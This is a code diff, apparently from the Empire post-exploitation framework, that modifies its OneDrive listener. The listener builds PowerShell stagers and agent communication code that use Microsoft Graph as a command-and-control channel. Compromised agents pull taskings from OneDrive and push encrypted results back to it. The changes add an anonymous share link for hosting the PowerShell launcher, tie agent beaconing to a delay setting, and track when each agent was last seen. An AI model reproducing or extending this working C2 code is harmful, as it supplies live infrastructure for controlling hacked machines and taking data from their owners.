@@ -3,6 +3,7 @@ import random
 import os
 import re
 import time
+from datetime import datetime
 import copy
 import traceback
 import sys
@@ -282,12 +283,12 @@ class Listener:
             print helpers.color("[!] listeners/onedrive generate_stager(): no language specified")
             return None
 
-        poll_interval = listenerOptions['PollInterval']['Value']
         staging_key = listenerOptions['StagingKey']['Value']
         base_folder = listenerOptions['BaseFolder']['Value']
         staging_folder = listenerOptions['StagingFolder']['Value']
         working_hours = listenerOptions['WorkingHours']['Value']
         profile = listenerOptions['DefaultProfile']['Value']
+        agent_delay = listenerOptions['DefaultDelay']['Value']
 
         if language.lower() == 'powershell':
             f = open("%s/data/agent/stagers/onedrive.ps1" % self.mainMenu.installPath)
@@ -296,8 +297,8 @@ class Listener:
 
             stager = stager.replace("REPLACE_STAGING_FOLDER", "%s/%s" % (base_folder, staging_folder))
             stager = stager.replace('REPLACE_STAGING_KEY', staging_key)
-            stager = stager.replace('REPLACE_POLLING_INTERVAL', poll_interval)
             stager = stager.replace("REPLACE_TOKEN", token)
+            stager = stager.replace("REPLACE_POLLING_INTERVAL", agent_delay)
 
             if working_hours != "":
                 stager = stager.replace("REPLACE_WORKING_HOURS")
@@ -324,7 +325,6 @@ class Listener:
     def generate_comms(self, listener_options, client_id, token, refresh_token, redirect_uri, language=None):
 
         staging_key = listener_options['StagingKey']['Value']
-        poll_interval = listener_options['PollInterval']['Value']
         base_folder = listener_options['BaseFolder']['Value']
         taskings_folder = listener_options['TaskingsFolder']['Value']
         results_folder = listener_options['ResultsFolder']['Value']
@@ -370,40 +370,51 @@ class Listener:
 
         if($packets) {
             $encBytes = encrypt-bytes $packets
-            $routingPacket = New-RoutingPacket -encData $encBytes -Meta 5
+            $RoutingPacket = New-RoutingPacket -encData $encBytes -Meta 5
+        } else {
+            $RoutingPacket = ""
+        }
+
+        $wc = Get-WebClient
+        $resultsFolder = "%s"
+
+        try {
+            try {
+                $data = $null
+                $data = $wc.DownloadData("https://graph.microsoft.com/v1.0/drive/root:/$resultsFolder/$($script:SessionID).txt:/content")
+            } catch {}
+
+            if($data -and $data.length -ne 0) {
+                $routingPacket = $data + $routingPacket
+            }
 
             $wc = Get-WebClient
-            $resultsFolder = "%s"
-
-            try {
-                try {
-                    $data = $null
-                    $data = $wc.DownloadData("https://graph.microsoft.com/v1.0/drive/root:/$resultsFolder/$($script:SessionID).txt:/content")
-                } catch {}
-
-                if($data -and $data.length -ne 0) {
-                    $routingPacket = $data + $routingPacket
-                }
-
-                $wc = Get-WebClient
-                $null = $wc.UploadData("https://graph.microsoft.com/v1.0/drive/root:/$resultsFolder/$($script:SessionID).txt:/content", "PUT", $RoutingPacket)
-                $script:missedChecking = 0
-            }
-            catch {
-                if($_ -match "Unable to connect") {
-                    $script:missedCheckins += 1
-                }
+            $null = $wc.UploadData("https://graph.microsoft.com/v1.0/drive/root:/$resultsFolder/$($script:SessionID).txt:/content", "PUT", $RoutingPacket)
+            $script:missedChecking = 0
+            $script:lastseen = get-date
+        }
+        catch {
+            if($_ -match "Unable to connect") {
+                $script:missedCheckins += 1
             }
         }
     }
-            """ % ("%s/%s" % (listener_options['BaseFolder']['Value'], listener_options['ResultsFolder']['Value']))
+            """ % ("%s/%s" % (base_folder, results_folder))
 
             get_message = """
+    $script:lastseen = Get-Date
     function script:get-task {
         try {
             $wc = Get-WebClient
 
             $TaskingsFolder = "%s"
+
+            #If we haven't sent a message recently...
+            if($script:lastseen.addseconds($script:AgentDelay * 2) -lt (get-date)) {
+                send-message -packets ""
+            }
+            $script:MissedCheckins = 0
+
             $data = $wc.DownloadData("https://graph.microsoft.com/v1.0/drive/root:/$TaskingsFolder/$($script:SessionID).txt:/content")
 
             if($data -and ($data.length -ne 0)) {
@@ -411,7 +422,6 @@ class Listener:
                 $null = $wc.UploadString("https://graph.microsoft.com/v1.0/drive/root:/$TaskingsFolder/$($script:SessionID).txt", "DELETE", "")
                 $Data
             }
-            $script:MissedCheckins = 0
         }
         catch {
             if($_ -match "Unable to connect") {
@@ -419,7 +429,7 @@ class Listener:
             }
         }
     }
-            """ % ("%s/%s" % (listener_options['BaseFolder']['Value'], listener_options['TaskingsFolder']['Value']))
+            """ % ("%s/%s" % (base_folder, taskings_folder))
 
             return token_manager + post_message + get_message
 
@@ -531,6 +541,15 @@ class Listener:
 
             r = s.put("%s/drive/root:/%s/%s/%s:/content" %(base_url, base_folder, staging_folder, "LAUNCHER-PS.TXT"),
                         data=ps_launcher, headers={"Content-Type": "text/plain"})
+
+            if r.status_code == 201 or r.status_code == 200:
+                item = r.json()
+                r = s.post("%s/drive/items/%s/createLink" % (base_url, item['id']),
+                            json={"scope": "anonymous", "type": "view"},
+                            headers={"Content-Type": "application/json"})
+                launcher_url = "https://api.onedrive.com/v1.0/shares/%s/driveitem/content" % r.json()['shareId']
+                #print helpers.color("[*] PS Launcher URL for %s: %s" % (listener_name, launcher_url))
+
             #r = s.put("%s/drive/root:/%s/%s/%s:/content" %(base_url, base_folder, staging_folder, "STAGE0PY.TXT"),
                       #data=py_launcher, headers={"Content-Type": "text/plain"})
 
@@ -576,7 +595,6 @@ class Listener:
             dispatcher.send("[*] Got new auth token", sender="listeners/onedrive")
 
         s.headers['Authorization'] = "Bearer " + token['access_token']
-        print token['access_token']
 
         setup_folders()
 
@@ -643,7 +661,7 @@ class Listener:
 
                 agent_ids = self.mainMenu.agents.get_agents_for_listener(listener_name)
                 for agent_id in agent_ids:
-                    task_data = self.mainMenu.agents.handle_agent_request(agent_id, 'powershell', staging_key)
+                    task_data = self.mainMenu.agents.handle_agent_request(agent_id, 'powershell', staging_key, update_lastseen=False)
                     if task_data:
                         try:
                             r = s.get("%s/drive/root:/%s/%s/%s.txt:/content" % (base_url, base_folder, taskings_folder, agent_id))
@@ -661,11 +679,19 @@ class Listener:
                 for item in search.json()['children']:
                     try:
                         agent_id = item['name'].split(".")[0]
-                        dispatcher.send("[*] Downloading results from %s/%s, %d bytes" % (results_folder, item['name'], item['size']), sender="listeners/onedrive")
-                        r = s.get(item['@microsoft.graph.downloadUrl'])
-                        self.mainMenu.agents.handle_agent_data(staging_key, r.content, listener_options)
-                        dispatcher.send("[*] Deleting %s/%s" % (results_folder, item['name']), sender="listeners/onedrive")
-                        s.delete("%s/drive/items/%s" % (base_url, item['id']))
+                        if not agent_id in agent_ids:
+                            dispatcher.send("[*] Invalid agent, deleting %s/%s" % (results_folder, item['name']), sender="listeners/onedrive")
+                            s.delete("%s/drive/items/%s" % (base_url, item['id']))
+                            continue
+                        seen_time = datetime.strptime(item['lastModifiedDateTime'], "%Y-%m-%dT%H:%M:%S.%fZ")
+                        seen_time = helpers.utc_to_local(seen_time)
+                        self.mainMenu.agents.update_agent_lastseen_db(agent_id, seen_time)
+                        if(item['size'] > 1): #only need to download results if there's actually something there
+                            dispatcher.send("[*] Downloading results from %s/%s, %d bytes" % (results_folder, item['name'], item['size']), sender="listeners/onedrive")
+                            r = s.get(item['@microsoft.graph.downloadUrl'])
+                            self.mainMenu.agents.handle_agent_data(staging_key, r.content, listener_options, update_lastseen=False)
+                            dispatcher.send("[*] Deleting %s/%s" % (results_folder, item['name']), sender="listeners/onedrive")
+                            s.delete("%s/drive/items/%s" % (base_url, item['id']))
                     except Exception, e:
                         dispatcher.send("[!] Error handling agent results for %s, %s" % (item['name'], e), sender="listeners/onedrive")
 
